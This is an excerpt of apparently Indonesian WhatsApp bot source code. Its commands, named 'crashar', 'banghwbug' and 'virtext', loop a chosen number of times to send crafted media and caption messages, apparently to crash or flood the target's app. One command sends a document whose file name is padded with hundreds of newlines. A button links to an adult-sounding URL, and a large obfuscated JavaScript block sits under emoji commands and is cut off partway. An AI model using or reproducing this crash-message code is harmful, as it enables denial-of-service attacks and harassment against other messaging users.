"fileName": `🔥 © banghw☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'banghwvirtext1': case 'banghwsu': case 'crashar1': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone}` }, { quoted: doc })
}
}
break
case 'banghwvirtext2': case 'banghwtol': case 'crashar2': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone1}` }, { quoted: doc })
}
}
break
case 'banghwvirtext3': case 'banghwmemek': case 'crashar3': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone2}` }, { quoted: doc })
}
}
break
case 'banghwvirtext4': case 'banghwcontol': case 'crashar4': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone3}` }, { quoted: doc })
}
}
break
case 'banghwvirtext5': case 'banghwtextv': case 'crashar5': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone4}` }, { quoted: doc })
}
}
break
case 'banghwvirtext6': case 'banghwgas': case 'crashar6':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone5}` }, { quoted: doc })
}
}
break
case 'banghwvirtext7': case 'banghwvirtext': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${iphone6}` }, { quoted: doc })
}
}
break
case 'banghwvirtext8': case 'banghwvirtext1': case 'crashar7':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${buttonkal}` }, { quoted: doc })
}
}
break
case 'banghwvirtext9': case 'banghwvirtext2': case 'crashar8':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© banghw${buttonvirus}` }, { quoted: doc })
}
}
break
case 'banghwvirtext10': case 'banghwvirtext3': case 'crashar9': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `banghw${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'banghwbug1': case 'banghwcrash': case 'crashar10':{
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
}
break
//=================================================//
case 'banghwbug2': case 'banghwcrash1': case 'crashar11': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© © banghw${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
}
break
case 'jadijago': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
fileName: `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${teks}  ${buttonkal}`,
footer: ` ${teks} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
				headerType: 5
}
haikal.sendMessage(m.chat, message, { quoted : m })
}
}
break

//Masih Project

case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
if (isBan) throw sticBanLu(from)
(function(_0x5591c6,_0x336305){function _0x1e99d6(_0x2a6b90,_0x3e55d6,_0x59bcfe,_0x406276,_0x438441){return _0x34d4(_0x59bcfe-0x4b,_0x3e55d6);}function _0x2bf4b8(_0x6e6cae,_0x1346d2,_0x40ad63,_0x24c37d,_0x1f864c){return _0x34d4(_0x1346d2- -0x393,_0x24c37d);}function _0x5c4a48(_0x5483b5,_0x1f3448,_0x18c562,_0x465d66,_0x56e7b3){return _0x34d4(_0x56e7b3- -0x48,_0x465d66);}function _0x36158d(_0x56807c,_0x5f5db5,_0x33c991,_0x31baea,_0x410dbe){return _0x34d4(_0x56807c- -0x67,_0x5f5db5);}function _0x2030d3(_0x187a79,_0x297c44,_0x43d8d1,_0x5acf55,_0x2d82f8){return _0x34d4(_0x187a79-0x246,_0x2d82f8);}var _0x250c85=_0x5591c6();while(!![]){try{var _0x1c357c=-parseInt(_0x2030d3(0x52c,0x481,0x4e4,0x497,0x5ab))/(0x1*-0x2353+-0x24d5+0x4829)*(parseInt(_0x2030d3(0x4e4,0x597,0x54e,0x57b,0x4a3))/(0x10f*0x2+0x121c+-0x8*0x287))+-parseInt(_0x2030d3(0x533,0x587,0x505,0x48d,0x535))/(0x1af+0x4*-0x487+-0x1070*-0x1)*(parseInt(_0x5c4a48(0x23c,0x172,0x173,0x23b,0x20f))/(-0x221+0x1ec1+-0x1c9c))+-parseInt(_0x5c4a48(0x19a,0x1eb,0xc8,0x204,0x167))/(-0xe28+0x1305+0x5*-0xf8)*(parseInt(_0x2bf4b8(-0x165,-0x199,-0x210,-0x1d4,-0x175))/(-0x20*-0x2f+-0x160+-0x47a))+parseInt(_0x2030d3(0x48f,0x530,0x45d,0x43b,0x3f8))/(-0x44f*-0x1+0x1d*-0x12f+0x1e0b)+parseInt(_0x36158d(0x17a,0xe6,0x134,0x15c,0x186))/(-0x1891+-0x2535+0x3dce)+-parseInt(_0x2bf4b8(-0x15d,-0x114,-0x72,-0x16e,-0xd7))/(-0x23d1+0x4*0x5ec+0xc2a)+-parseInt(_0x36158d(0x256,0x259,0x278,0x1e5,0x2ab))/(-0x722+0x3b*-0x3b+-0x1*-0x14c5)*(-parseInt(_0x5c4a48(0x1b9,0x289,0x234,0x1c3,0x1c9))/(-0x1*0x1c34+0x1365*-0x1+0x2fa4));if(_0x1c357c===_0x336305)break;else _0x250c85['push'](_0x250c85['shift']());}catch(_0x54ac3e){_0x250c85['push'](_0x250c85['shift']());}}}(_0x1b97,0x6de9c*0x1+0x45557+-0x16*-0xd32));var _0x5b0975=(function(){function _0x3fb7db(_0x247c2e,_0x3392e8,_0x26384b,_0x4e2e72,_0x44be2a){return _0x34d4(_0x44be2a- -0xcb,_0x247c2e);}function _0x377f95(_0x2b41f8,_0x1854db,_0x46725b,_0x44e239,_0x92491e){return _0x34d4(_0x46725b- -0x3a2,_0x1854db);}var _0x546697={'lICzn':function(_0x34754c,_0x31086f){return _0x34754c(_0x31086f);},'urlEf':function(_0x37e916,_0x58d554){return _0x37e916+_0x58d554;},'uupPv':_0x2bb6ca(0x2b8,0x3c7,0x373,0x378,0x2bf)+_0x3fb7db(0x114,0x1ab,0x76,0x13c,0xf9)+_0x2bb6ca(0x364,0x287,0x2c8,0x28a,0x278)+_0x470e09(0x5bb,0x587,0x5be,0x5d3,0x5ad),'FMKpq':_0x3fb7db(0x25a,0x157,0x1dc,0x12f,0x1c5)+_0x2bb6ca(0x49d,0x3b5,0x42f,0x3a1,0x3b3)+_0x2bb6ca(0x432,0x361,0x39f,0x36d,0x2f4)+_0x58e90d(0x24c,0x228,0x273,0x266,0x249)+_0x58e90d(0x273,0x2ce,0x353,0x27f,0x2a3)+_0x3fb7db(0x160,0x1f8,0x1da,0x1e1,0x1dd)+'\x20)','fPYeM':function(_0x3e7609,_0x2e4b8e){return _0x3e7609===_0x2e4b8e;},'ezXCy':_0x58e90d(0x240,0x264,0x2ae,0x21a,0x270),'tpdVa':_0x2bb6ca(0x2bd,0x2eb,0x2bd,0x28b,0x225),'RyiJx':function(_0x3a57ab,_0x360395){return _0x3a57ab!==_0x360395;},'IamBt':_0x470e09(0x434,0x50b,0x4bb,0x580,0x4e2),'KsUQh':_0x2bb6ca(0x2d1,0x248,0x2ab,0x367,0x20e),'SPSrG':function(_0x1d45f1,_0x25f761){return _0x1d45f1!==_0x25f761;},'bnzFT':_0x377f95(-0x1fd,-0xf6,-0x16e,-0x139,-0xca),'ugHNU':_0x3fb7db(0x175,0x1c3,0x15e,0x8b,0x124)};function _0x470e09(_0x43c009,_0x36a883,_0x276588,_0x3e1292,_0x53249c){return _0x34d4(_0x53249c-0x324,_0x36a883);}function _0x2bb6ca(_0x397471,_0x102e70,_0x5acf73,_0xf03fa1,_0x3efa7b){return _0x34d4(_0x5acf73-0x105,_0xf03fa1);}var _0x13d685=!![];function _0x58e90d(_0xadecc6,_0x2e2f29,_0xe96e7,_0x4f00ac,_0x199c25){return _0x34d4(_0x199c25- -0x35,_0x4f00ac);}return function(_0x2c465f,_0x1971ae){var _0x426d52={'ZJupJ':function(_0x2958c0,_0x232e67){function _0x13fa99(_0x34fd2d,_0x30983b,_0x1b82f0,_0x202810,_0x3a784d){return _0x34d4(_0x34fd2d-0x25a,_0x3a784d);}return _0x546697[_0x13fa99(0x46f,0x491,0x3e4,0x3cb,0x3f4)](_0x2958c0,_0x232e67);},'ujImb':function(_0x3f310e,_0x8bcd4f){function _0x53aa56(_0x375f88,_0x44bc27,_0x12dafe,_0x63623e,_0x2a3d3f){return _0x34d4(_0x2a3d3f- -0x1e1,_0x63623e);}return _0x546697[_0x53aa56(0x17,-0x81,0x15,-0x18,-0x25)](_0x3f310e,_0x8bcd4f);},'KLfqg':_0x546697[_0x414543(0x47a,0x4bf,0x466,0x522,0x448)],'uHXIL':_0x546697[_0x414543(0x437,0x44e,0x39a,0x383,0x3dc)],'UbQsU':function(_0x38479e,_0x523d3c){function _0x7006ca(_0x3cd35d,_0x164936,_0x4ceb85,_0x59a18e,_0x4bcfd3){return _0x5c120b(_0x164936,_0x164936-0x85,_0x3cd35d-0x101,_0x59a18e-0xc0,_0x4bcfd3-0xe7);}return _0x546697[_0x7006ca(0x3b4,0x3b6,0x3ae,0x2ed,0x351)](_0x38479e,_0x523d3c);},'jfaBt':_0x546697[_0x5c120b(0x35d,0x3a6,0x382,0x34f,0x37d)],'MUEWr':_0x546697[_0x277a3f(0x121,0x1db,0x1cc,0x1d4,0x132)],'IdlBO':function(_0xbf5c8d,_0xc4a568){function _0x3fc50f(_0x3dbfc0,_0x52fbbd,_0x525085,_0x57b2fc,_0x1cc3a8){return _0x414543(_0x3dbfc0-0x147,_0x52fbbd-0x9b,_0x57b2fc-0x149,_0x525085,_0x1cc3a8-0x18f);}return _0x546697[_0x3fc50f(0x603,0x513,0x5e0,0x5ab,0x54a)](_0xbf5c8d,_0xc4a568);},'AobKG':_0x546697[_0x5c120b(0x428,0x39a,0x366,0x426,0x335)],'PcVbv':_0x546697[_0x414543(0x504,0x489,0x4b1,0x508,0x453)]};function _0x277a3f(_0x3345a4,_0x152f52,_0x38479d,_0x53f9b5,_0x2af68c){return _0x3fb7db(_0x152f52,_0x152f52-0x10f,_0x38479d-0x1c3,_0x53f9b5-0x4f,_0x3345a4- -0x115);}function _0x414543(_0x545380,_0x2ad194,_0x123cb1,_0x3e7643,_0x379122){return _0x58e90d(_0x545380-0x113,_0x2ad194-0x179,_0x123cb1-0x7,_0x3e7643,_0x123cb1-0x1f5);}function _0x5c120b(_0x4ee889,_0x1186ce,_0x1e0022,_0x25bb08,_0x1ccd13){return _0x470e09(_0x4ee889-0x49,_0x4ee889,_0x1e0022-0xc5,_0x25bb08-0x38,_0x1e0022- -0x278);}function _0x438de6(_0x39c2df,_0x226a13,_0x5325bb,_0x16b407,_0x3963d5){return _0x2bb6ca(_0x39c2df-0xba,_0x226a13-0x173,_0x39c2df-0x95,_0x5325bb,_0x3963d5-0xbd);}function _0x15f8e9(_0x39a8eb,_0x3ec531,_0x4144d8,_0xd784a0,_0xddcfd){return _0x377f95(_0x39a8eb-0x61,_0x3ec531,_0xd784a0-0x697,_0xd784a0-0x178,_0xddcfd-0x2f);}if(_0x546697[_0x414543(0x328,0x38b,0x3ed,0x3da,0x3e5)](_0x546697[_0x15f8e9(0x4e3,0x578,0x566,0x54f,0x529)],_0x546697[_0x277a3f(0x16,-0x3a,-0x6d,0x67,0x7e)])){var _0x33fe9d=_0x13d685?function(){function _0x19029c(_0x2600bf,_0x37b2f1,_0x2f847a,_0x53127b,_0x40a9d1){return _0x414543(_0x2600bf-0x52,_0x37b2f1-0x1f3,_0x40a9d1- -0x168,_0x2600bf,_0x40a9d1-0x8);}function _0x4135e7(_0x3cd2f4,_0x409a0c,_0xf7158e,_0x50f692,_0xc3f399){return _0x438de6(_0xc3f399-0x141,_0x409a0c-0x5e,_0x3cd2f4,_0x50f692-0x1f,_0xc3f399-0xd);}function _0x2463e3(_0x52ac62,_0x2a4e6d,_0x28a0b2,_0x157a09,_0x40cb13){return _0x15f8e9(_0x52ac62-0x9f,_0x52ac62,_0x28a0b2-0x13c,_0x28a0b2- -0x1ac,_0x40cb13-0x88);}function _0x1ea698(_0x53a7a6,_0x3e806d,_0xb0ca3d,_0x5e3323,_0x5aab30){return _0x15f8e9(_0x53a7a6-0x2,_0xb0ca3d,_0xb0ca3d-0x9f,_0x3e806d- -0x332,_0x5aab30-0x8d);}function _0x1bfdc3(_0x218117,_0x5d2981,_0x3def73,_0x5231a6,_0xeb28f4){return _0x277a3f(_0x5231a6-0x10c,_0xeb28f4,_0x3def73-0x174,_0x5231a6-0x1f1,_0xeb28f4-0x17e);}var _0x4d566c={'xSblo':function(_0x5c7be5,_0x488c29){function _0x2407dc(_0x2c4d47,_0x221dc2,_0x1fe228,_0x3f6358,_0xf320fe){return _0x34d4(_0x3f6358-0x2ec,_0x2c4d47);}return _0x426d52[_0x2407dc(0x552,0x5f6,0x4d2,0x57f,0x55e)](_0x5c7be5,_0x488c29);},'sbdMP':function(_0x82c84b,_0x4349c6){function _0x3c6833(_0x4d6adf,_0x1b61cb,_0x5297fa,_0x13e9b6,_0x257966){return _0x34d4(_0x5297fa- -0x27c,_0x257966);}return _0x426d52[_0x3c6833(-0x127,-0xbb,-0xde,-0x19d,-0x160)](_0x82c84b,_0x4349c6);},'ecdRU':function(_0x123dc2,_0x54d439){function _0x529f94(_0x3e3336,_0x2fbfa4,_0x574223,_0x1d2d5c,_0x1591fb){return _0x34d4(_0x574223-0x2cc,_0x1591fb);}return _0x426d52[_0x529f94(0x3fd,0x4f6,0x46a,0x4f2,0x45c)](_0x123dc2,_0x54d439);},'eUvJt':_0x426d52[_0x1bfdc3(0x2c2,0x2bf,0x181,0x239,0x237)],'fPhrL':_0x426d52[_0x1bfdc3(0xa6,0x178,0xab,0x131,0x1c9)]};if(_0x426d52[_0x2463e3(0x3e1,0x33d,0x3da,0x38c,0x46b)](_0x426d52[_0x1bfdc3(0x1f9,0x1d8,0x21f,0x220,0x1b0)],_0x426d52[_0x4135e7(0x431,0x52e,0x3ef,0x546,0x48b)]))_0x350629=_0x4d566c[_0x1bfdc3(0x1aa,0x2d0,0x22d,0x248,0x1b4)](_0x577647,_0x4d566c[_0x2463e3(0x29d,0x2e6,0x2ff,0x32b,0x3bf)](_0x4d566c[_0x1bfdc3(0x13f,0x234,0x217,0x1cb,0x125)](_0x4d566c[_0x1ea698(0x1bf,0x207,0x1f4,0x15c,0x1be)],_0x4d566c[_0x1ea698(0x217,0x17a,0x14d,0x105,0x23d)]),');'))();else{if(_0x1971ae){if(_0x426d52[_0x19029c(0x35b,0x3aa,0x321,0x2b0,0x340)](_0x426d52[_0x1ea698(0x2ca,0x2d9,0x29d,0x2ec,0x2be)],_0x426d52[_0x1ea698(0x1d3,0x19b,0x22f,0x144,0x103)])){var _0x356bf1=_0x1971ae[_0x2463e3(0x34c,0x472,0x3fa,0x45b,0x42a)](_0x2c465f,arguments);return _0x1971ae=null,_0x356bf1;}else{if(_0xe0111){var _0x481f97=_0x25a0bb[_0x1bfdc3(0x289,0x18b,0x234,0x1dd,0x137)](_0x304e63,arguments);return _0x47b776=null,_0x481f97;}}}}}:function(){};return _0x13d685=![],_0x33fe9d;}else{var _0x4a7894=_0x3e6afb[_0x15f8e9(0x660,0x56a,0x5e9,0x5a6,0x5e0)](_0x5c0cac,arguments);return _0x59b8cd=null,_0x4a7894;}};}()),_0x5bcb2c=_0x5b0975(this,function(){var _0x5bee79={};function _0x249043(_0x52f669,_0x449668,_0x2d56db,_0x431459,_0x319274){return _0x34d4(_0x449668- -0x21e,_0x431459);}function _0x5645b7(_0x356fb1,_0x2f9cac,_0x34f8c7,_0x54aadc,_0x276ee2){return _0x34d4(_0x356fb1- -0x2ee,_0x54aadc);}function _0x288936(_0x7cdec5,_0x5c6af8,_0x2ba0f7,_0x14dce1,_0x5f0c38){return _0x34d4(_0x2ba0f7-0x21,_0x5c6af8);}_0x5bee79[_0x288936(0x1cd,0x234,0x28d,0x2fd,0x30c)]=_0x308470(0x335,0x2b5,0x296,0x3a0,0x384)+_0x288936(0x26a,0x311,0x32b,0x282,0x384)+'+$';function _0x308470(_0xcd83f,_0x8a0f77,_0x538c58,_0x301106,_0x49b048){return _0x34d4(_0xcd83f-0xc0,_0x538c58);}var _0xf27dd9=_0x5bee79;function _0x3d4f8f(_0x459bcf,_0xaf6954,_0x16265f,_0x190311,_0x460598){return _0x34d4(_0xaf6954- -0x3be,_0x16265f);}return _0x5bcb2c[_0x3d4f8f(-0x150,-0xc0,0x2,-0x129,-0x30)+_0x288936(0x2ea,0x32e,0x2a2,0x295,0x32e)]()[_0x3d4f8f(-0x226,-0x16d,-0x14b,-0x233,-0xdd)+'h'](_0xf27dd9[_0x249043(0x17,0x4e,0xb6,0x96,-0x43)])[_0x5645b7(0x10,0xbb,-0xaa,0x2,0xa0)+_0x3d4f8f(-0x1c8,-0x13d,-0x153,-0xc5,-0x139)]()[_0x249043(0x13c,0x7e,0x82,0x79,0x8e)+_0x249043(0x69,0x55,-0x71,0xa3,-0x2d)+'r'](_0x5bcb2c)[_0x288936(0x327,0x269,0x272,0x250,0x1ca)+'h'](_0xf27dd9[_0x249043(-0x27,0x4e,-0x5e,0xd3,0x23)]);});_0x5bcb2c(),(function(){function _0x5bf4fa(_0x317ecc,_0x24d30f,_0x51e2c1,_0x2f8f0a,_0x572192){return _0x34d4(_0x51e2c1-0x2e8,_0x572192);}function _0x506473(_0x28ddd3,_0x317daa,_0x8a5952,_0x57ddd1,_0x3f2b3a){return _0x34d4(_0x57ddd1-0xe6,_0x317daa);}function _0x5ac64c(_0x59259f,_0x54a897,_0x4a5011,_0x3a2d3f,_0x1acf20){return _0x34d4(_0x3a2d3f-0x62,_0x4a5011);}var _0x590c74={'zOQvp':function(_0x4e80ea){return _0x4e80ea();},'ytoPA':function(_0x1836d5,_0x1c4331){return _0x1836d5===_0x1c4331;},'vosQW':_0x4aca5d(0x72,0x2d,0x50,-0xa,-0x54),'kgWUt':function(_0x4faeb,_0x122a7d){return _0x4faeb!==_0x122a7d;},'YMVcn':_0x506473(0x316,0x3b0,0x266,0x30c,0x379),'wAhWu':function(_0x3e3427,_0xdc3cfa){return _0x3e3427(_0xdc3cfa);},'pqYqx':function(_0xb85560,_0x3d85be){return _0xb85560+_0x3d85be;},'dCjVK':function(_0x5d1ded,_0x382360){return _0x5d1ded+_0x382360;},'muvRl':_0x506473(0x2d9,0x2b2,0x394,0x354,0x2b1)+_0x34bc5b(0x1ff,0x1ee,0x284,0x22b,0x2ff)+_0x506473(0x34b,0x233,0x283,0x2a9,0x32f)+_0x506473(0x380,0x390,0x390,0x36f,0x2b1),'pAqdm':_0x506473(0x344,0x42e,0x425,0x376,0x373)+_0x5ac64c(0x385,0x32d,0x403,0x38c,0x2ec)+_0x506473(0x37d,0x3c6,0x3b2,0x380,0x319)+_0x4aca5d(-0x38,0xbc,0xc4,0x82,0x22)+_0x5bf4fa(0x5f5,0x56a,0x5c0,0x562,0x5dc)+_0x506473(0x38b,0x41e,0x417,0x38e,0x340)+'\x20)','rATMF':_0x506473(0x428,0x4a7,0x388,0x3f8,0x3f0),'stcTi':function(_0xf8ec64){return _0xf8ec64();}},_0x2ca1c9=function(){function _0x52d9c8(_0x4a10fe,_0x16a409,_0x44bfe2,_0x5c3f67,_0x2c62c1){return _0x506473(_0x4a10fe-0x160,_0x2c62c1,_0x44bfe2-0x133,_0x5c3f67- -0x26e,_0x2c62c1-0x1a8);}function _0x420a1(_0x8c3975,_0x588b8d,_0x443749,_0xa6e73,_0x4ce4e6){return _0x4aca5d(_0x8c3975-0x5d,_0xa6e73,_0x443749-0xf2,_0xa6e73-0x1a2,_0x588b8d-0x251);}function _0x3efcbd(_0x36704d,_0x29349,_0x43c592,_0x51ffe7,_0xe72087){return _0x4aca5d(_0x36704d-0xeb,_0x43c592,_0x43c592-0x113,_0x51ffe7-0x8a,_0x29349-0x28c);}function _0x76075a(_0x4a3798,_0x1f1d78,_0x394d77,_0x459252,_0x1823b4){return 